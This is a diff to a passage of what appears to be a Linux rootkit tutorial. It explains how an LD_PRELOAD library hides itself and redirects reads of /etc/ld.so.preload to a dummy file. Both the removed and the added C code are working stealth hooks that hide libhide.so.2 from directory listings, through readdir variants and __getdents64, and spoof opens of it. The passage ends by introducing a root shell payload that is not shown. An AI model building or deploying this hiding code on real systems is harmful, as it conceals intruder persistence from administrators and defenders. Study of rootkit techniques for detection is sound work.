@@ -305,135 +305,59 @@ openat(AT_FDCWD, "/etc/ld.so.preload.dummy", O_RDONLY) = 6
 
 So, this tells us two things. First, when we try to read /etc/ld.so.preload, a shared library at /usr/local/lib/libhide.so.2 is being accessed as well as, second, a dummy file is being opened instead of the real file. But if we look at the directory listing for /usr/local/lib/, it shows us nothing by the name of libhide.so.2 resides there. That is because of the following code which hides the shared library from tools like ls.
 
-/* hidelib.c */
+
+/* libhide.c */
 #define _GNU_SOURCE
 #include <stdio.h>
 #include <string.h>
+#include <unistd.h>
 #include <dirent.h>
-#include <fcntl.h>
-#include <stdarg.h>
 #include <dlfcn.h>
-#include <sys/types.h>
 
 #define LIB_TO_HIDE "libhide.so.2"
 
-// Thread-local guard to prevent infinite recursion loop within hooks
-__thread int inside_hook = 0; 
-
-// Evaluates if a given directory entry matches the library file we want to hide
-static int should_hide_file(const char *name) {
-    if (!name) return 0;
-    return (strcmp(name, LIB_TO_HIDE) == 0);
-}
-
-struct dirent *readdir(DIR *dirp) {
-    static struct dirent* (*orig)(DIR*) = NULL;
-    if (!orig) orig = dlsym(RTLD_NEXT, "readdir");
-
-    if (inside_hook) return orig(dirp);
-
-    inside_hook = 1;
-    struct dirent *e;
-    while ((e = orig(dirp))) {
-        if (should_hide_file(e->d_name)) continue; // Skip if it matches libhide.so.2
-        inside_hook = 0;
-        return e;
+// Hook __getdents64 (used internally by coreutils like 'ls')
+int __getdents64(unsigned int fd, struct dirent *dirp, unsigned int count) {
+    static int (*orig_getdents64)(unsigned int, struct dirent*, unsigned int) = NULL;
+    if (!orig_getdents64) {
+        orig_getdents64 = dlsym(RTLD_NEXT, "__getdents64");
     }
-    inside_hook = 0;
-    return NULL;
-}
 
-struct dirent64 *readdir64(DIR *dirp) {
-    static struct dirent64* (*orig)(DIR*) = NULL;
-    if (!orig) orig = dlsym(RTLD_NEXT, "readdir64");
+    int total_bytes = orig_getdents64(fd, dirp, count);
+    if (total_bytes <= 0) return total_bytes;
 
-    if (inside_hook) return orig(dirp);
-
-    inside_hook = 1;
-    struct dirent64 *e;
-    while ((e = orig(dirp))) {
-        if (should_hide_file(e->d_name)) continue; // Skip if it matches libhide.so.2
-        inside_hook = 0;
-        return e;
-    }
-    inside_hook = 0;
-    return NULL;
-}
-
-#pragma GCC diagnostic push
-#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
-int readdir_r(DIR *dirp, struct dirent *entry, struct dirent **result) {
-    static int (*orig)(DIR*, struct dirent*, struct dirent**) = NULL;
-    if (!orig) orig = dlsym(RTLD_NEXT, "readdir_r");
-
-    if (inside_hook) return orig(dirp, entry, result);
-
-    inside_hook = 1;
-    int ret = orig(dirp, entry, result);
-    if (ret == 0 && *result != NULL) {
-        if (should_hide_file((*result)->d_name)) {
-            inside_hook = 0;
-            return readdir_r(dirp, entry, result); // Recurse to get next clean entry
+    int bpos = 0;
+    while (bpos < total_bytes) {
+        struct dirent *d = (struct dirent *) ((char *)dirp + bpos);
+        
+        if (strcmp(d->d_name, LIB_TO_HIDE) == 0) {
+            int remaining_bytes = total_bytes - (bpos + d->d_reclen);
+            memmove(d, (char *)d + d->d_reclen, remaining_bytes);
+            total_bytes -= d->d_reclen;
+            continue; 
         }
-    }
-    inside_hook = 0;
-    return ret;
-}
-#pragma GCC diagnostic pop
-
-int open(const char *pathname, int flags, ...) {
-    static int (*orig_open)(const char*, int, mode_t) = NULL;
-    if (!orig_open) orig_open = dlsym(RTLD_NEXT, "open");
-
-    mode_t mode = 0;
-    if (flags & O_CREAT) {
-        va_list args;
-        va_start(args, flags);
-        mode = va_arg(args, mode_t);
-        va_end(args);
+        bpos += d->d_reclen;
     }
 
-    if (inside_hook) return orig_open(pathname, flags, mode);
-
-    // If something tries to target the library directly, spoof the path
-    if (pathname && strstr(pathname, LIB_TO_HIDE)) return orig_open("/dev/null", flags, mode);
-    return orig_open(pathname, flags, mode);
+    return total_bytes;
 }
 
-int open64(const char *pathname, int flags, ...) {
-    static int (*orig_open64)(const char*, int, mode_t) = NULL;
-    if (!orig_open64) orig_open64 = dlsym(RTLD_NEXT, "open64");
-
-    mode_t mode = 0;
-    if (flags & O_CREAT) {
-        va_list args;
-        va_start(args, flags);
-        mode = va_arg(args, mode_t);
-        va_end(args);
+// Hook readdir (used by standard C programs)
+struct dirent *readdir(DIR *dirp) {
+    static struct dirent *(*orig_readdir)(DIR *) = NULL;
+    if (!orig_readdir) {
+        orig_readdir = dlsym(RTLD_NEXT, "readdir");
     }
 
-    if (inside_hook) return orig_open64(pathname, flags, mode);
-
-    if (pathname && strstr(pathname, LIB_TO_HIDE)) return orig_open64("/dev/null", flags, mode);
-    return orig_open64(pathname, flags, mode);
-}
-
-int openat(int dirfd, const char *pathname, int flags, ...) {
-    static int (*orig_openat)(int, const char*, int, mode_t) = NULL;
-    if (!orig_openat) orig_openat = dlsym(RTLD_NEXT, "openat");
-
-    mode_t mode = 0;
-    if (flags & O_CREAT) {
-        va_list args;
-        va_start(args, flags);
-        mode = va_arg(args, mode_t);
-        va_end(args);
+    struct dirent *entry;
+    while ((entry = orig_readdir(dirp)) != NULL) {
+        // If it matches, skip it and get the next entry
+        if (strcmp(entry->d_name, LIB_TO_HIDE) == 0) {
+            continue;
+        }
+        return entry;
     }
-
-    if (inside_hook) return orig_openat(dirfd, pathname, flags, mode);
-
-    if (pathname && strstr(pathname, LIB_TO_HIDE)) return orig_openat(dirfd, "/dev/null", flags, mode);
-    return orig_openat(dirfd, pathname, flags, mode);
+    return NULL;
 }
 
 So far we have looked at intercepting/redirecting for stealth. Hiding the module itself as well as hiding the entry in virtual memory. What's the point? Well let's say the rootkits primary payload is a rootshell. which could be done with the following code.
